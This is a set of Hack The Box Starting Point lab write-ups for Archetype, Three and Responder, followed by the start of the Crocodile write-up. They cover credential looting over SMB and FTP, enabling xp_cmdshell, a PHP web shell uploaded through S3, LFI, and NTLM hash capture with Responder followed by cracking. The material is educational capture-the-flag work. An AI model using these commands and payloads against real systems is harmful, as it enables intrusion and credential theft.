# ![Hack The Box](https://img.shields.io/badge/-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black) HTB Starting Point — Progress Tracker

### 📊 Tier 2 Progress

| Machine | Tier | Services | Date Completed | Write-Up |
|---------|------|----------|----------------|----------|
| **Archetype** | 2 | SMB (445), MSSQL (1433), WinRM (5985) | 2026-04-04 | [↓ Jump to Archetype](#htb-starting-point-archetype) |
| **Oopsie** | 2 | HTTP (80), SSH (22) | — | — |
| **Vaccine** | 2 | FTP (21), HTTP (80), SSH (22) | — | — |
| **Unified** | 2 | HTTP (8080/8443), SSH (22) | — | — |

---

> **Tier 2 Progress:** 1/4 machines completed (25%)  
> **Next:** Oopsie  
> **Last Updated:** April 4, 2026

---

# HTB Starting Point: Archetype

## MSSQL Exploitation → xp_cmdshell → PowerShell History → Privilege Escalation

| System Detail | Information |
|---------------|-------------|
| Machine Name | Archetype |
| Difficulty | Starting Point (Tier 2) |
| Target IP | 10.129.82.155 |
| Completion Date | April 04, 2026 |

## 📋 Table of Contents

- [Reconnaissance](#reconnaissance)
- [SMB Enumeration](#smb-enumeration)
- [MSSQL Exploitation](#mssql-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flag Capture](#flag-capture)
- [Questions & Answers](#questions--answers)
- [Quick Reference](#quick-reference)
- [Troubleshooting](#troubleshooting)
- [Lessons Learned](#lessons-learned)

## 💻 Environment Setup

| Component | Specification |
|-----------|---------------|
| Attack Machine | Kali Linux (2024.x) |
| Connectivity | OpenVPN (HTB Lab Configuration) |
| Tools Used | Nmap, smbclient, mssqlclient-ng, pymssql, evil-winrm, impacket |

> **Note:** Ensure your HTB VPN is active and you can ping the target IP before beginning enumeration.

---

### 🔍 Phase 1: Reconnaissance

#### Initial Port Scan

Discovery reveals key services: SMB (445), MSSQL (1433), and WinRM (5985).

```bash
# Discovery scan
sudo nmap -p- --min-rate 1000 10.129.82.155

# Service versioning
sudo nmap -sC -sV -p 135,139,445,1433,5985 10.129.82.155

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

---

### 📂 Phase 2: SMB Enumeration
**List Available SMB Shares**
```bash
smbclient -L //10.129.82.155 -N
```

**Output:**
```bash

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC

    [!IMPORTANT]
    The backups share is non-administrative (no $ suffix) and accessible without credentials.
```
#### Connect and Download Configuration File
```bash
# Connect to the backups share
smbclient //10.129.82.155/backups -N

# Download the configuration file
smb: \> get prod.dtsConfig
smb: \> exit

# View the contents
cat prod.dtsConfig

Extracted Credentials:
xml

<ConfiguredValue>
  Data Source=.;
  Password=M3g4c0rp123;
  User ID=ARCHETYPE\sql_svc;
  ...
</ConfiguredValue>

Credential Type	Value
Username	ARCHETYPE\sql_svc
Password	M3g4c0rp123
```

---

### 🗄️ Phase 3: MSSQL Exploitation

#### ⚠️ ERROR: Connection Timeout

**Initial Attempt (Failed):**

```bash
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.82.155 -windows-auth
```
**Error:**
```bash
Encryption required, switching to TLS
timed out
```
#### 🔍 Root Cause Analysis

| Factor | Explanation |
| :--- | :--- |
| **TLS Encryption Required** | SQL Server 2017 requires encrypted connections |
| **OpenSSL 3.0+ on Kali** | Newer OpenSSL versions have SECLEVEL=2 (strict security) |
| **Legacy Cipher Suites** | Target server uses older TLS ciphers |
| **Handshake Failure** | OpenSSL rejects legacy ciphers → timeout |

#### ✅ Solution: Use `mssqlclient-ng`

```bash
# Install mssqlclient-ng
pipx install mssqlclient-ng

# Connect successfully
mssqlclient-ng 10.129.82.155 -u 'ARCHETYPE\sql_svc' -p 'M3g4c0rp123' -windows-auth
```
**Result: Same timeout error occurred.**

✅ Working Solution: Python with pymssql
bash

#### Create virtual environment
```bash
python3 -m venv ~/pymssql-env
source ~/pymssql-env/bin/activate
```
#### Install pymssql
```bash
pip install pymssql
```

**Connection Script (This Worked):**

```python
import pymssql

conn = pymssql.connect(
    server='10.129.82.155',
    user=r'ARCHETYPE\sql_svc',
    password='M3g4c0rp123',
    database='master',
    autocommit=True  # Critical for RECONFIGURE commands
)
```
**Verification of Successful Connection:**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
```sql
xp_cmdshell 'whoami'
```
**Output:**
```text
archetype\sql_svc
```
---

### 🔑 Phase 4: Privilege Escalation

#### Locate PowerShell History File

```sql
xp_cmdshell 'dir "C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"'
```
**Read PowerShell History**
```sql
xp_cmdshell 'type "C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"'
```
**Output:**
```text
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```
**Success! Administrator Credentials Found:**

- **Username:** `administrator`
- **Password:** `MEGACORP_4dm1n!!`

#### Capture User Flag

```sql
xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt'
```
#### **User Flag:**
```bash
HTB{REDACTED}
```

---

### 👑 Phase 5: Administrator Access & Root Flag

#### Connect via WinRM (Port 5985)

```bash
evil-winrm -i 10.129.82.155 -u administrator -p 'MEGACORP_4dm1n!!'
```
**Capture Root Flag**
```bash
type C:\Users\Administrator\Desktop\root.txt
```
**Root Flag:**
```bash
HTB{REDACTED}
```

---

### 📊 Attack Path Summary

```text
┌─────────────────────────────────────────────────────────────────────────┐
│ 1. SMB Enumeration                                                      │
│    └─► Found "backups" share                                           │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 2. Downloaded prod.dtsConfig                                            │
│    └─► Extracted sql_svc credentials                                   │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 3. MSSQL Connection (Timeout → Fixed with pymssql)                     │
│    └─► Authenticated as sql_svc                                        │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 4. Enabled xp_cmdshell                                                  │
│    └─► Gained OS command execution                                     │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 5. Read PowerShell History File                                         │
│    └─► Found administrator credentials                                 │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 6. Connected via WinRM as Administrator                                 │
│    └─► SYSTEM access                                                   │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ 7. Captured Root Flag                                                   │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 🐛 Troubleshooting

| Issue | Solution |
| :--- | :--- |
| `impacket-mssqlclient` connection timeout | Use `pymssql` with `autocommit=True` instead |
| `pip install` externally-managed-environment error | Use Python virtual environments (`python3 -m venv`) |
| `mssqlclient-ng` also times out | Fall back to `pymssql` Python script |
| `psexec` hanging at file upload | Use `evil-winrm` (port 5985) or `wmiexec` |
| `Access is denied` reading root flag | Need full Administrator shell, not just `xp_cmdshell` |
| `evil-winrm` connection fails | Ensure port 5985 is open and credentials are correct |
| PowerShell history file not found | Check user profile path: `C:\Users\<USER>\AppData\Roaming\...` |
| SMB share access denied | Try null session with `-N` flag or anonymous login |

---

## 💡 Lessons Learned

| # | Lesson |
| :--- | :--- |
| 1 | **SMB Enumeration** — Always enumerate SMB shares. Non-administrative shares (without `$`) can contain sensitive configuration files with credentials. |
| 2 | **Configuration Files** — Files like `prod.dtsConfig`, `web.config`, and `unattend.xml` are goldmines for credentials. Never leave them exposed. |
| 3 | **TLS Compatibility** — Older Windows services (MSSQL 2017) may have TLS compatibility issues with modern OpenSSL. `pymssql` with `autocommit=True` successfully bypassed this issue. |
| 4 | **PowerShell History** — PowerShell saves command history by default at `ConsoleHost_history.txt`. Users often type passwords directly in commands, making this a critical post-exploitation target. |
| 5 | **xp_cmdshell** — If enabled, this MSSQL stored procedure allows OS command execution and is a powerful privilege escalation vector. Always check if it's enabled or can be enabled. |
| 6 | **Multiple Access Methods** — If `psexec` fails, alternative methods like WinRM (port 5985) or WMI often work. Always check for open management ports. |
| 7 | **Virtual Environments** — Use `python3 -m venv` to avoid Kali's externally-managed-environment errors when installing Python packages. |
| 8 | **Credential Reuse** — The same credentials pattern (`MEGACORP_4dm1n!!`) suggests password reuse across services. Always check for reused credentials. |
| 9 | **WinRM for Remote Access** — Port 5985 (WinRM) is often overlooked but provides a clean PowerShell shell as seen with `evil-winrm`. |
| 10 | **Always Check User Directories** — User desktops, documents, and AppData folders often contain flags and sensitive information. |

---

## 🔗 Resources

- [Impacket Documentation](https://github.com/fortra/impacket) — MSSQL, SMB, and Windows exploitation tools
- [pymssql Documentation](https://pymssql.readthedocs.io/) — Python MSSQL driver
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) — WinRM shell for Windows remote management
- [PowerShell PSReadLine](https://docs.microsoft.com/en-us/powershell/module/psreadline/) — PowerShell history documentation
- [xp_cmdshell Documentation](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) — Microsoft official documentation
- [smbclient Manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) — SMB command-line client

---

## 🏷️ Tags

`#htb` `#archetype` `#smb` `#mssql` `#xp_cmdshell` `#powershell-history` `#privilege-escalation` `#winrm` `#evil-winrm` `#impacket` `#tls-timeout` `#pymssql` `#windows-exploitation`

---

## 🏁 Flags Captured

| Flag | Location | Value |
| :--- | :--- | :--- |
| **User Flag** | `C:\Users\sql_svc\Desktop\user.txt` | `HTB{REDACTED}` |
| **Root Flag** | `C:\Users\Administrator\Desktop\root.txt` | `HTB{REDACTED}` |

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: April 4, 2026*

</div>

---

# ![Hack The Box](https://img.shields.io/badge/-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black) HTB Starting Point — Progress Tracker

| Machine | Tier | Services | Date Completed | Write-Up |
|---------|------|----------|----------------|----------|
| **Sequel** | 1 | MySQL/MariaDB (3306) | 2026-03-25 | [↓ Jump to Sequel](#htb-starting-point-sequel-mysqlmariadb) |
| **Crocodile** | 1 | FTP (21), HTTP (80) | 2026-03-26 | [↓ Jump to Crocodile](#htb-starting-point-crocodile-ftp--web) |
| **Responder** | 1 | HTTP (80) → WinRM (5985) | 2026-03-27 | [↓ Jump to Responder](#htb-starting-point-responder-lfi--hash-capture--winrm) |
| **Three** | 1 | S3 (LocalStack) | 2026-04-03 | [↓ Jump to Three](#htb-starting-point-three-s3-bucket-misconfiguration) |

---

> **Tier 1 Progress:** 4/4 machines completed (100%) ✅  
> **Next:** Tier 2  
> **Last Updated:** April 3, 2026
---

Markdown

# HTB Starting Point: Three
> **S3 Bucket Exploitation → PHP Webshell → Remote Code Execution (RCE)**

| **System Detail** | **Information** |
| :--- | :--- |
| **Machine Name** | Three |
| **Difficulty** | Starting Point (Tier 1) |
| **Target IP** | `10.129.227.248` |
| **Completion Date** | April 03, 2026 |

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Subdomain Enumeration](#-subdomain-enumeration)
3. [Service Identification](#-service-identification)
4. [S3 Bucket Enumeration](#-s3-bucket-enumeration)
5. [Webshell Upload & RCE](#-webshell-upload--rce)
6. [Flag Capture](#-flag-capture)
7. [Questions & Answers](#-questions--answers)
8. [Quick Reference](#-quick-reference)
9. [Troubleshooting](#-troubleshooting)
10. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup
To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, ffuf, curl, awscli, gobuster |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

### 🔍 Phase 1: Reconnaissance

#### Initial Port Scan
Discovery reveals two primary entry points: **SSH** and **HTTP**.

```bash
# Discovery scan
sudo nmap -p- --min-rate 1000 10.129.227.248

# Service versioning
sudo nmap -sC -sV -p 22,80 10.129.227.248

Port	State	Service	Version
22/tcp	Open	ssh	OpenSSH 7.6p1 Ubuntu
80/tcp	Open	http	Apache httpd 2.4.29
Local DNS Mapping
```

The target has no DNS server, so we must manually add entries to /etc/hosts. Without this, the browser/tools won't know where thetoppers.htb is located.

```Bash
echo "10.129.227.248    thetoppers.htb" | sudo tee -a /etc/hosts
```

 ### 🔍 Phase 2: Subdomain Enumeration

Subdomains often expose additional services. We brute-force potential subdomains by fuzzing the Host header using ffuf.

```Bash
ffuf -u "[http://thetoppers.htb](http://thetoppers.htb)" \
     -H "Host: FUZZ.thetoppers.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc all \
     -fs 11947

    [!IMPORTANT]
    Discovered Subdomain: s3.thetoppers.htb

    Add this to your /etc/hosts file:
    echo "10.129.227.248    s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### 🛠 Phase 3: Service Identification

Checking the HTTP headers for the new subdomain reveals the underlying technology.
```Bash
curl -I [http://s3.thetoppers.htb](http://s3.thetoppers.htb)
```

Header	Value	Meaning
Server	hypercorn-h11	Python ASGI server (LocalStack)
x-amz-*	Present	AWS S3 specific headers

Identified Service: LocalStack (AWS S3 emulator).

### 📦 Phase 4: S3 Bucket Enumeration
1. AWS CLI Configuration

Configure with dummy credentials as LocalStack doesn't require real ones for this lab.
```Bash
aws configure
# Settings: Access Key: test | Secret Key: test | Region: us-east-1 | Format: json
```

2. List Buckets and Contents
```Bash
# List buckets
aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 ls

# List bucket contents recursively
aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 ls s3://thetoppers.htb/ --recursive
```

Finding: The bucket contains index.php and an images/ directory, confirming it serves as the web root.

### 🚀 Phase 5: Webshell Upload & RCE
1. Test Write Permissions
```Bash
echo "test" > test.txt
aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 cp test.txt s3://thetoppers.htb/
```

2. Create and Upload PHP Webshell

Since write access is confirmed, we upload a simple command executor.

```Bash
# Create payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

#### Upload payload
aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 cp shell.php s3://thetoppers.htb/

3. Verify Execution
```Bash
curl "[http://thetoppers.htb/shell.php?cmd=id](http://thetoppers.htb/shell.php?cmd=id)"
# Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 🏁 Phase 6: Flag Capture

With Remote Code Execution (RCE) achieved, we search for and read the flag.
```Bash
# Locate the flag
curl "[http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20%22flag.txt%22%202](http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20%22flag.txt%22%202)>/dev/null"
```

#### Read the flag
```bash
curl "[http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt](http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt)"

    [!SUCCESS]
    Flag: HTB{s3_buckets_are_not_always_secure}
```
## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | File used to resolve hostnames without DNS? | `/etc/hosts` |
| 2 | Subdomain discovered during enumeration? | `s3` |
| 3 | Service running on the subdomain? | S3 (LocalStack) |
| 4 | Utility used to interact with the service? | `awscli` |
| 5 | Command to set up AWS CLI? | `aws configure` |
| 6 | Command to list S3 buckets? | `aws s3 ls` |
| 7 | Server scripting language? | PHP |
| 8 | Location of the flag? | `/var/www/flag.txt` |

---
## ⚡ Quick Reference

### AWS CLI Setup
```bash
# Configure with dummy credentials
aws configure
# Access Key ID: dummy
# Secret Access Key: dummy
# Region: us-east-1 (or any)
# Output format: json

# List S3 buckets
aws s3 ls --endpoint-url http://s3.toppers.htb

# List contents of a bucket
aws s3 ls s3://bucket-name --endpoint-url http://s3.toppers.htb
```

File Upload Testing
```bash
# Upload PHP shell to S3
aws s3 cp shell.php s3://bucket-name/ --endpoint-url http://s3.toppers.htb
```

### Upload with curl (URL encode spaces as %20 or +)
curl -X PUT "http://s3.toppers.htb/bucket-name/shell.php" --data-binary @shell.php
PHP Web Shell
php
<?php system($_GET['cmd']); ?>
Flag Retrieval
```bash
# Execute command via web shell
curl "http://toppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
```
### PHP Web Shell
php
<?php system($_GET['cmd']); ?>
Flag Retrieval
```bash
# Execute command via web shell
curl "http://toppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
```

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| Could not resolve toppers.htb or s3.toppers.htb | Add both entries to `/etc/hosts` |
| ffuf shows too many results | Filter by size: `-fs {default_response_size}` |
| awscli authentication errors | Use dummy credentials with `aws configure` — LocalStack ignores them |
| curl upload fails with spaces | Encode spaces as `%20` or use `+` in URLs |
| Bucket not found | Verify bucket name with `aws s3 ls` first |
| PHP not executing | Ensure file is in a web-accessible directory where PHP execution is allowed |

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Cloud Misconfigurations** — Always test for read/write access on cloud storage endpoints. Buckets with public write access are a critical finding. |
| 2 | **DNS Mapping** — Manual host mapping is a fundamental step in virtual host environments. Always check for subdomains and add them to `/etc/hosts`. |
| 3 | **Write + PHP = Win** — If you can upload a file to a directory where the server executes scripts (like PHP), you have essentially won. This is a classic file upload to RCE chain. |
| 4 | **LocalStack** — Emulation tools are great for development, but can be dangerous if misconfigured in a reachable network. They often have default credentials or no authentication at all. |
| 5 | **Subdomain Enumeration** — Always enumerate subdomains. They often expose additional services (like S3, API gateways, admin panels) that aren't visible on the main domain. |
| 6 | **Cloud Services ≠ Secure by Default** — Just because a service is running in a "cloud" context doesn't mean it's secure. LocalStack, MinIO, and other emulators often lack authentication out of the box. |

---

## 🔗 Resources

- [AWS CLI Documentation](https://docs.aws.amazon.com/cli/latest/reference/s3/) — Official S3 commands
- [LocalStack](https://localstack.cloud/) — AWS cloud service emulator
- [ffuf](https://github.com/ffuf/ffuf) — Fast web fuzzer for subdomain enumeration
- [PHP Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md) — File upload to RCE techniques

---

## 🏷️ Tags

`#htb` `#toppers` `#s3` `#localstack` `#awscli` `#cloud-misconfiguration` `#php` `#file-upload` `#rce` `#subdomain-enumeration`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: April 3, 2026*

</div>

---

# HTB Starting Point: Responder (LFI → Hash Capture → WinRM)

| **Machine Info** | |
|------------------|-|
| **Name** | Unika |
| **Difficulty** | Starting Point (Tier 1) |
| **Services** | HTTP (80) → WinRM (5985) |
| **Date Completed** | 2026-03-27 |

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Local File Inclusion (LFI) Discovery](#-local-file-inclusion-lfi-discovery)
3. [Remote File Inclusion (RFI) Test](#-remote-file-inclusion-rfi-test)
4. [Hash Capture with Responder](#-hash-capture-with-responder)
5. [Hash Cracking](#-hash-cracking)
6. [Remote Access (WinRM)](#-remote-access-winrm)
7. [Questions & Answers](#-questions--answers)
8. [Quick Reference](#-quick-reference)
9. [Troubleshooting](#-troubleshooting)
10. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, curl, Responder, hashcat, evil-winrm |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Host Resolution
```bash
echo "10.129.58.173 unika.htb" | sudo tee -a /etc/hosts
```

### Port Scan
```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.58.173
```

**Results:**
```
PORT   STATE SERVICE
80/tcp open  http
```

### Service Version Detection with Nmap
```bash
# Run default scripts and version detection
nmap -sC -sV -p 80 10.129.58.173
```

**Output:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
```

**Interpretation:**
| Field | Value |
|-------|-------|
| **Web Server** | Apache 2.4.52 (Win64) |
| **PHP Version** | 8.1.1 |
| **Environment** | XAMPP on Windows |
| **Framework** | Custom PHP with session cookies |

---

## 🧩 Local File Inclusion (LFI) Discovery

### Initial Parameter Testing

The `page` parameter is used to load different language versions.

```bash
# Test the page parameter
curl -v http://unika.htb/?page=home
```

**Error Revealed:**
```
Warning: include(home): Failed to open stream in C:\xampp\htdocs\index.php on line 11
```

This confirmed:
- PHP `include()` is used with a user-controlled `page` parameter
- The target is a Windows XAMPP environment
- No input validation → LFI vulnerability

### LFI Confirmation

```bash
# Attempt to read a known Windows file
curl "http://unika.htb/?page=../../../../windows/win.ini"
```

**Output:**
```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

✅ Successfully read Windows system file → LFI confirmed.

### Source Code Disclosure

```bash
# Read index.php using PHP filters (base64 encoded)
curl "http://unika.htb/?page=php://filter/convert.base64-encode/resource=index.php"
```

**Decoded Source Code (Key Section):**
```php
<?php
$domain = "unika.htb";
if($_SERVER['SERVER_NAME'] != $domain) {
  echo '<meta http-equiv="refresh" content="0;url=http://unika.htb/">';
  die();
}
if(!isset($_GET['page'])) {
  include("./english.html");
}
else {
  include($_GET['page']);   # ← LFI vulnerability
}
```

---

## 📡 Remote File Inclusion (RFI) Test

### RFI Attempt

```bash
# Attempt to include a file from the attacker's machine
curl "http://unika.htb/?page=http://10.10.14.87/test.php"
```

**Error Response:**
```
Warning: include(): http:// wrapper is disabled by allow_url_include=0
```

✅ RFI is disabled, but the attempt revealed that the server attempts to authenticate via SMB when given a UNC path (`//`).

---

## 🎣 Hash Capture with Responder

### Start Responder (Attacker Machine)

```bash
# Start Responder on the VPN interface to listen for NTLM hashes
sudo responder -I tun0 -w -F -v
```

### Trigger NTLM Authentication

The target will attempt to authenticate to the attacker's machine when it tries to access a UNC path (`//`).

```bash
# Trigger the target to send an NTLM hash to the attacker
curl "http://unika.htb/?page=//10.10.14.87/test"
```

### Hash Captured in Responder

```
[SMB] NTLMv2-SSP Client   : 10.129.58.173
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b2a572a47cc6a77c:...
```

---

## 🔓 Hash Cracking

### Save Hash to File

```bash
# Save the captured NTLMv2 hash to a file
echo 'Administrator::RESPONDER:b2a572a47cc6a77c:...' > hash.txt
```

### Crack with hashcat

```bash
# Crack the NTLMv2 hash using rockyou.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Cracked Password:**
```
badminton
```

---

## 💻 Remote Access (WinRM)

### Connect with Evil-WinRM

```bash
# Connect to the target using the cracked credentials
evil-winrm -i 10.129.58.173 -u Administrator -p badminton
```

✅ Successful connection established.

### Flag Locations

- **User flag:** `C:\Users\mike\Desktop\flag.txt`
- **Root flag:** `C:\Users\Administrator\Desktop\root.txt`

### Retrieve Flags

```powershell
type "C:\Users\mike\Desktop\flag.txt"
type "C:\Users\Administrator\Desktop\root.txt"
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | What is the name of the URL parameter used to load different language versions? | `page` |
| 2 | Which parameter value exploits LFI? | `../../../../windows/win.ini` |
| 3 | Which parameter value exploits RFI? | `//10.10.14.6/somefile` |
| 4 | What flag do we use in Responder to specify the network interface? | `-I` |
| 5 | What port does WinRM listen on? | `5985` |
| 6 | What password did we crack for Administrator? | `badminton` |

---

## ⚡ Quick Reference

### Host Configuration
```bash
# Add domain to hosts file
echo "10.129.58.173 unika.htb" | sudo tee -a /etc/hosts
```

### LFI Testing
```bash
# Basic LFI test
curl "http://unika.htb/?page=../../../../windows/win.ini"

# Read source code (base64 encoded)
curl "http://unika.htb/?page=php://filter/convert.base64-encode/resource=index.php"
```

### Responder
```bash
# Start responder on VPN interface
sudo responder -I tun0 -w -F -v

# Trigger NTLM authentication
curl "http://unika.htb/?page=//10.10.14.87/test"
```

### Hash Cracking
```bash
# Crack NetNTLMv2 hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Remote Access
```bash
# Connect via WinRM
evil-winrm -i 10.129.58.173 -u Administrator -p badminton
```

---

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| Could not resolve host: unika.htb | Add entry to `/etc/hosts` |
| RFI not working | Check `allow_url_include=0` in PHP config — use LFI instead |
| Responder not capturing | Verify interface with `ip a`, use `-I tun0` |
| hashcat: rockyou.txt not found | Decompress with `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
| WinRM connection fails | Verify service is running: `nmap -p 5985 10.129.58.173` |

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **LFI is powerful** — Even without RFI, LFI can lead to source code disclosure and further exploitation. |
| 2 | **UNC paths trigger NTLM** — Windows servers automatically attempt NTLM authentication when accessing UNC paths like `//attacker_ip/share`. |
| 3 | **Responder captures hashes** — Use Responder to capture NTLM hashes when targets connect to your machine. |
| 4 | **rockyou.txt is essential** — A good wordlist cracks most common passwords. |
| 5 | **WinRM is a common foothold** — Port 5985 is often open and provides a reliable shell with valid credentials. |
| 6 | **Default credentials are not always the answer** — We had to discover the password by cracking the hash. |

---

## 🔗 Resources

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm) — Remote shell via WinRM
- [Responder GitHub](https://github.com/lgandx/Responder) — LLMNR/NBT-NS/MDNS poisoner
- [Hashcat](https://hashcat.net/hashcat/) — Password recovery tool
- [XAMPP](https://www.apachefriends.org/) — Windows web server stack used by target

---

## 🏷️ Tags

`#htb` `#starting-point` `#unika` `#lfi` `#responder` `#ntlm` `#hashcat` `#winrm` `#evil-winrm`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: March 27, 2026*

</div>

---

# HTB Starting Point: Crocodile (FTP + Web)

## Machine Info

| Field | Value |
|-------|-------|
| **Name** | Crocodile |
| **Difficulty** | Starting Point (Tier 1) |
| **Services** | FTP (21), HTTP (80) |
| **Date Completed** | 2026-03-26 |

---

## 📋 Table of Contents

- [Environment Setup](#environment-setup)
- [Reconnaissance](#reconnaissance)
- [FTP Enumeration](#ftp-enumeration)
- [Web Enumeration](#web-enumeration)
- [Credential Discovery](#credential-discovery)
- [Flag Discovery](#flag-discovery)
- [Questions & Answers](#questions--answers)
- [Quick Reference](#quick-reference)
- [Lessons Learned](#lessons-learned)
- [Resources](#resources)
- [Tags](#tags)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| Component | Specification |
|-----------|---------------|
| **Attack Machine** | Kali Linux (2024.x) |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, ftp, curl, gobuster |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan

```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.55.198
```

**Results:**
```text
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

### Service Version Detection with Nmap

```bash
# Run default scripts and version detection
nmap -sC -sV -p 21,80 10.129.55.198
```

**Output:**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
| -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
|_ftp-syst: 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

**Interpretation:**

| Service | Version | Key Info |
|---------|---------|----------|
| FTP | vsFTPd 3.0.3 | Anonymous login allowed; contains credential files |
| HTTP | Apache 2.4.41 (Ubuntu) | Bootstrap business template, PHP likely enabled |

---

## 📁 FTP Enumeration

### Anonymous FTP Access

```bash
# Connect to FTP server
ftp 10.129.55.198
```

**Login:**
```text
Name (10.129.55.198:kali): anonymous
Password: (press Enter)
230 Login successful.
```

### Listing Files

```bash
ftp> ls -la
```

**Output:**
```text
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```

### Download Credential Files

```bash
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

### View Downloaded Files

```bash
# Usernames
cat allowed.userlist
```

**Usernames:**
```text
aron
pwnmeow
egotisticalsw
admin
```

```bash
# Passwords
cat allowed.userlist.passwd
```

**Passwords:**
```text
root
